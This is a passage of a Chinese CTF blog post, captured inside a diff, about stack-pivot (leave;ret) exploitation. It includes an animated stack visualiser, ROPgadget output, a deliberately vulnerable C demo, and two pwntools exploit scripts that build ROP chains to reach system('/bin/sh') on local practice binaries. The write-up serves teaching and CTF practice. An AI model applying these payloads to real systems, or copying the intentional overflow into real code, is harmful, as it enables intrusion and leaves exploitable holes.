+        { addr: &#39;...&#39;, val: &#39;...&#39;, note: &#39;&#39;, id: &#39;gap1&#39;, hidden: false },
+        { addr: &#39;0xc8&#39;, val: &#39;/bin/sh&#39;, note: &#39;String&#39;, id: &#39;m-c8&#39;, hidden: false },
+        { addr: &#39;...&#39;, val: &#39;...&#39;, note: &#39;&#39;, id: &#39;gap2&#39;, hidden: false },
+        { addr: &#39;0xd1&#39;, val: &#39;0xe1&#39;, note: &#39;Saved RBP&#39;, id: &#39;m-ebp-loc&#39;, hidden: false },
+        { addr: &#39;0xd9&#39;, val: &#39;leave_ret&#39;, note: &#39;Return Addr&#39;, id: &#39;m-ret-loc&#39;, hidden: false }
+    ];
+
+    let currentStepIndex = 0;
+
+    const steps = [
+        {
+            instr: &amp;quot;Initial State&amp;quot;,
+            desc: &amp;quot;正常栈布局。RBP指向0xd1。此时攻击者已溢出缓冲区，准备修改返回地址。&amp;quot;,
+            rsp: &#39;0xa1&#39;, rbp: &#39;0xd1&#39;, rip: &#39;0x1000&#39;,
+            action: (data) =&amp;gt; {}
+        },
+        {
+            instr: &amp;quot;Overflow!&amp;quot;,
+            desc: &amp;quot;缓冲区溢出发生：0xd1处的旧RBP被覆盖为0xa1，0xd9处的返回地址被覆盖为leave_ret gadget的地址。&amp;quot;,
+            rsp: &#39;0xa1&#39;, rbp: &#39;0xd1&#39;, rip: &#39;0x1000&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xd1&#39;).val = &#39;0xa1&#39;;
+                data.find(i =&amp;gt; i.addr === &#39;0xd1&#39;).highlight = true;
+                [&#39;0xa1&#39;, &#39;0xa9&#39;, &#39;0xb1&#39;, &#39;0xb9&#39;, &#39;0xc1&#39;].forEach(a =&amp;gt; data.find(i =&amp;gt; i.addr === a).hidden = false);
+            }
+        },
+        {
+            instr: &amp;quot;leave (1/2): mov rsp, rbp&amp;quot;,
+            desc: &amp;quot;函数正常结束，开始执行自身的leave指令。第一步：将RBP的值赋给RSP。RSP移至0xd1。&amp;quot;,
+            rsp: &#39;0xd1&#39;, rbp: &#39;0xd1&#39;, rip: &#39;leave&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xd1&#39;).highlight = true;
+            }
+        },
+        {
+            instr: &amp;quot;leave (2/2): pop rbp&amp;quot;,
+            desc: &amp;quot;leave指令第二步：pop rbp。从栈顶(0xd1)弹出值到RBP。RBP变为0xa1，RSP步进到0xd9。注意：RBP已被劫持！&amp;quot;,
+            rsp: &#39;0xd9&#39;, rbp: &#39;0xa1&#39;, rip: &#39;leave&#39;,
+            action: (data) =&amp;gt; {}
+        },
+        {
+            instr: &amp;quot;ret (1/2): pop rip&amp;quot;,
+            desc: &amp;quot;执行ret指令。逻辑上等同于 pop rip。从栈顶(0xd9)取出劫持后的返回地址(leave_ret)。&amp;quot;,
+            rsp: &#39;0xd9&#39;, rbp: &#39;0xa1&#39;, rip: &#39;ret&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xd9&#39;).active = true;
+            }
+        },
+        {
+            instr: &amp;quot;ret (2/2): jmp rip&amp;quot;,
+            desc: &amp;quot;ret完成。RSP + 8 移动到 0xe1。程序跳转到 gadget 地址执行：这导致程序第二次进入 leave 指令逻辑。&amp;quot;,
+            rsp: &#39;0xe1&#39;, rbp: &#39;0xa1&#39;, rip: &#39;leave_ret&#39;,
+            action: (data) =&amp;gt; {}
+        },
+        {
+            instr: &amp;quot;leave (1/2): mov rsp, rbp&amp;quot;,
+            desc: &amp;quot;第二次执行leave。第一步：rsp = rbp。由于RBP已经是0xa1，RSP瞬间跳回了低地址的攻击者控制区！&amp;quot;,
+            rsp: &#39;0xa1&#39;, rbp: &#39;0xa1&#39;, rip: &#39;leave&#39;,
+            action: (data) =&amp;gt; {}
+        },
+        {
+            instr: &amp;quot;leave (2/2): pop rbp&amp;quot;,
+            desc: &amp;quot;第二次执行leave。第二步：pop rbp。从0xa1弹出值。RBP变为0x1111。RSP步进到0xa9。&amp;quot;,
+            rsp: &#39;0xa9&#39;, rbp: &#39;0x1111&#39;, rip: &#39;leave&#39;,
+            action: (data) =&amp;gt; {}
+        },
+        {
+            instr: &amp;quot;ret: pop rip (ROP Start)&amp;quot;,
+            desc: &amp;quot;第二次leave后的ret动作。从0xa9弹出 pop_rdi 地址到RIP。ROP链正式开始执行。&amp;quot;,
+            rsp: &#39;0xb1&#39;, rbp: &#39;0x1111&#39;, rip: &#39;pop_rdi&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xa9&#39;).active = true;
+            }
+        },
+        {
+            instr: &amp;quot;pop rdi; ret&amp;quot;,
+            desc: &amp;quot;pop rdi将0xc8弹出到RDI寄存器。随后ret指令将RIP设置为backdoor地址。RSP移至0xc1。&amp;quot;,
+            rsp: &#39;0xc1&#39;, rbp: &#39;0x1111&#39;, rip: &#39;backdoor&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xb1&#39;).active = true;
+            }
+        },
+        {
+            instr: &amp;quot;Exploit Success!&amp;quot;,
+            desc: &amp;quot;程序跳转到 backdoor 执行，且 RDI 已通过 ROP 链指向了 /bin/sh 字符串。攻击完成。&amp;quot;,
+            rsp: &#39;0xc9&#39;, rbp: &#39;0x1111&#39;, rip: &#39;backdoor&#39;,
+            action: (data) =&amp;gt; {
+                data.find(i =&amp;gt; i.addr === &#39;0xc1&#39;).highlight = true;
+            }
+        }
+    ];
+
+    function renderStack(data, rspAddr, rbpAddr, ripAddr) {
+        const container = document.getElementById(&#39;stack-container&#39;);
+        container.innerHTML = &#39;&#39;;
+        data.forEach(item =&amp;gt; {
+            const row = document.createElement(&#39;div&#39;);
+            row.className = `memory-row flex items-center border-b last:border-0`;
+            
+            const isRsp = item.addr === rspAddr;
+            const isRbp = item.addr === rbpAddr;
+            const isRip = item.addr === ripAddr;
+            
+            const valClass = item.hidden ? &#39;hidden-content&#39; : &#39;revealed-content&#39;;
+            const highlightClass = item.highlight ? &#39;highlight-change&#39; : &#39;&#39;;
+            const activeClass = item.active ? &#39;bg-green-50&#39; : &#39;&#39;;
+
+            row.innerHTML = 
+                &amp;lt;div class=&amp;quot;w-20 text-[10px] font-mono text-gray-400 p-2 border-r bg-gray-50 flex items-center justify-center&amp;quot;&amp;gt;
+                    ${item.addr}
+                &amp;lt;/div&amp;gt;
+                &amp;lt;div id=&amp;quot;${item.id}&amp;quot; class=&amp;quot;flex-1 stack-cell font-mono font-bold text-gray-700 ${valClass} ${highlightClass} ${activeClass}&amp;quot;&amp;gt;
+                    &amp;lt;span&amp;gt;${item.val}&amp;lt;/span&amp;gt;
+                    &amp;lt;div class=&amp;quot;pointer-container&amp;quot;&amp;gt;
+                        ${isRsp ? &#39;&amp;lt;div class=&amp;quot;pointer-tag tag-rsp&amp;quot;&amp;gt;RSP&amp;lt;/div&amp;gt;&#39; : &#39;&#39;}
+                        ${isRbp ? &#39;&amp;lt;div class=&amp;quot;pointer-tag tag-rbp&amp;quot;&amp;gt;RBP&amp;lt;/div&amp;gt;&#39; : &#39;&#39;}
+                        ${isRip ? &#39;&amp;lt;div class=&amp;quot;pointer-tag tag-rip&amp;quot;&amp;gt;RIP指向此地址内容&amp;lt;/div&amp;gt;&#39; : &#39;&#39;}
+                    &amp;lt;/div&amp;gt;
+                &amp;lt;/div&amp;gt;
+                &amp;lt;div class=&amp;quot;w-40 text-[9px] text-gray-400 px-3 italic text-right leading-tight&amp;quot;&amp;gt;
+                    ${item.note}
+                &amp;lt;/div&amp;gt;
+            ;
+            container.appendChild(row);
+        });
+
+        document.getElementById(&#39;reg-rsp&#39;).innerText = &#39;0x&#39; + rspAddr.replace(&#39;0x&#39;,&#39;&#39;);
+        document.getElementById(&#39;reg-rbp&#39;).innerText = &#39;0x&#39; + rbpAddr.replace(&#39;0x&#39;,&#39;&#39;);
+        document.getElementById(&#39;reg-rip&#39;).innerText = ripAddr.startsWith(&#39;0x&#39;) ? ripAddr : &#39;Exec: &#39; + ripAddr;
+    }
+
+    function updateUI() {
+        const state = steps[currentStepIndex];
+        document.getElementById(&#39;current-instr&#39;).innerText = state.instr;
+        document.getElementById(&#39;step-description&#39;).innerText = state.desc;
+        
+        let currentData = JSON.parse(JSON.stringify(initialStack));
+        for (let i = 0; i &amp;lt;= currentStepIndex; i++) {
+            steps[i].action(currentData);
+        }
+
+        renderStack(currentData, state.rsp, state.rbp, state.rip);
+        
+        document.getElementById(&#39;prev-btn&#39;).disabled = currentStepIndex === 0;
+        document.getElementById(&#39;next-btn&#39;).innerText = currentStepIndex === steps.length - 1 ? &amp;quot;完成&amp;quot; : &amp;quot;下一步&amp;quot;;
+        document.getElementById(&#39;next-btn&#39;).disabled = currentStepIndex === steps.length - 1;
+    }
+
+    function nextStep() {
+        if (currentStepIndex &amp;lt; steps.length - 1) {
+            currentStepIndex++;
+            updateUI();
+        }
+    }
+
+    function prevStep() {
+        if (currentStepIndex &amp;gt; 0) {
+            currentStepIndex--;
+            updateUI();
+        }
+    }
+
+    function reset() {
+        currentStepIndex = 0;
+        updateUI();
+    }
+
+    window.onload = updateUI;
+&amp;lt;/script&amp;gt;
+</code></pre>
+<p>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;</code></pre></details><br>同时引入pwngdb分屏看的方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766396845979-36005c2f-e75a-4655-b68d-4ea220e13aa8.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>好现在来看exp如何写</p>
+<p>一开始会打印buffer的地址<code>printf(&quot;str1 is %p,input2:&quot;, buf);</code></p>
+<blockquote>
+<p><code>str1 is **0x7fffffffdd20**,input2:aaaaaaaa</code>←返回的地址长14字节</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766399800190-1ae55ccd-2b4a-4f33-8b06-fdd2dfa0df6b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary a.out --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040117d : pop rbp ; ret</span><br><span class="line">0x000000000040126f : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">.text:00000000004011DD 058 C9                            leave</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">r&#x27;/mnt/hgfs/E/CTF/比赛/2025校内赛决赛/项目/pwn/output/a.out&#x27;</span>)</span><br><span class="line">p = process(<span class="string">r&#x27;/mnt/hgfs/E/CTF/比赛/2025校内赛决赛/项目/pwn/output/a.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack大致长这样：b&#x27;0x7fffffffdd20&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;str1 is &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x40126f</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">leave_ret_addr=<span class="number">0x4011DD</span></span><br><span class="line">backdoor_addr=elf.sym[<span class="string">&#x27;backdor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="number">0x1111</span>,</span><br><span class="line">    pop_rdi_ret_addr,</span><br><span class="line">    stack + <span class="number">40</span>,</span><br><span class="line">    ret_addr,</span><br><span class="line">    backdoor_addr,</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    <span class="comment"># flat(b&#x27;/bin/sh&#x27;)=7</span></span><br><span class="line">    <span class="comment"># flat(b&#x27;/bin/sh\x00&#x27;)=8</span></span><br><span class="line">])</span><br><span class="line">payload =payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload +=flat([stack,leave_ret_addr])</span><br><span class="line">p.sendafter(<span class="string">&quot;input2:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h3><figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在程序目录下用该指令编译：gcc -z execstack -fno-stack-protector -no-pie -z norelro -O0 demo3.c</span></span><br><span class="line"><span class="comment">//得到一个a.out的程序</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> passwd = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">in_test1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">0x48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input2:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,str1,<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdor</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">    system(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tmp_tmp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pop %rdi;ret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    init_func();</span><br><span class="line">    in_test1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>唯一不同在于不打印栈地址了，所以需要把shell写到bss段上：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766486162230-b4956cae-154a-48d6-b4d7-f7b5283b5710.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>我们找到了可写地址是0x403000-0x404000，注意一下原本程序到的地址：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766486297919-87f00a19-d11b-474d-acde-ba0d589e9794.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>稍微距离这里远一点：可以给stack给一个地址<code>0x403600</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766489939841-58e7e966-d3bd-41c4-bbdb-e92fe0364ec7.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>可以尝试用excel画一下栈的运行逻辑，就应该能知道payload构成了：</p>
+<p>1.先利用栈溢出把<code>保存的rbp地址转成stack地址</code>、<code>返回地址转成read函数地址</code></p>
+<p>2.此时rbp已经到stack那边去了，然后留下rsp在原栈；执行leave、return指令之后rsp来到新栈处、rbp来到stack-0x50处，rsp+8</p>
+<p>3.stack下一个地址可以用leave_retn指令、也可以用leave：前者的填充栈需要用两个0x1,0x1填充（retn会让rsp+8）、后者一个即可</p>
+<p>4.接下来的payload跟原本的差不多了</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> ,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">elf=ELF(r<span class="string">&#x27;/mnt/hgfs/E/CTF/比赛/2025校内赛决赛/项目/pwn/output/3.out&#x27;</span>)</span><br><span class="line">p=process(r<span class="string">&#x27;/mnt/hgfs/E/CTF/比赛/2025校内赛决赛/项目/pwn/output/3.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">stack</span> = <span class="number">0x403c50</span></span><br><span class="line">read_addr = <span class="number">0x4011B6</span></span><br><span class="line">    #这里的read函数地址应该是整个读取<span class="number">50</span>字节的</span><br><span class="line">leave_addr=<span class="number">0x4011D6</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x401268</span></span><br><span class="line">backdoor_addr=elf.sym[<span class="string">&#x27;backdor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload += flat([<span class="built_in">stack</span>,read_addr])</span><br><span class="line">p.sendafter(b<span class="string">&#x27;input2:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=flat([</span><br><span class="line">    <span class="number">0x1</span>,</span><br><span class="line">    pop_rdi_ret_addr,</span><br><span class="line">    <span class="built_in">stack</span> - <span class="number">40</span>,</span><br><span class="line">    ret_addr,</span><br><span class="line">    backdoor_addr,</span><br><span class="line">    b<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += flat([<span class="built_in">stack</span><span class="number">-0x50</span>,leave_addr])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="原理补充"><a href="#原理补充" class="headerlink" title="原理补充"></a>原理补充</h1><p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1773803038504-e8adf49a-7d33-4f39-a5ef-44a72122f38e.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1773803053806-e10360c4-f7db-48dd-a628-5dd2be51fec5.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E2%91%A0%E5%8F%AF%E4%BB%A5%E4%B8%8E%E8%BE%93%E5%85%A5%E5%87%BD%E6%95%B0%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-list-text">①可以与输入函数搭配使用，实现任意地址写</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#demo1"><span class="toc-list-text">demo1</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E2%91%A1%E5%8F%98%E7%9B%B8%E5%A2%9E%E5%8A%A0%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6%E3%80%82"><span class="toc-list-text">②变相增加溢出长度。</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#demo3"><span class="toc-list-text">demo3</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E5%8E%9F%E7%90%86%E8%A1%A5%E5%85%85"><span class="toc-list-text">原理补充</span></a></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from ctf</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/ctf/_CTF/">
+              <strong>_CTF</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/_CTF/Week_1/">
+              <strong>Week_1</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/">
+              <strong>2025_SWPU-NSSCTF_秋季招新入门训练赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/%E8%BF%98%E5%9C%A8%E5%86%99%E3%80%82CopperSmith%E7%AE%97%E6%B3%95/">
+              <strong>还在写。CopperSmith算法</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
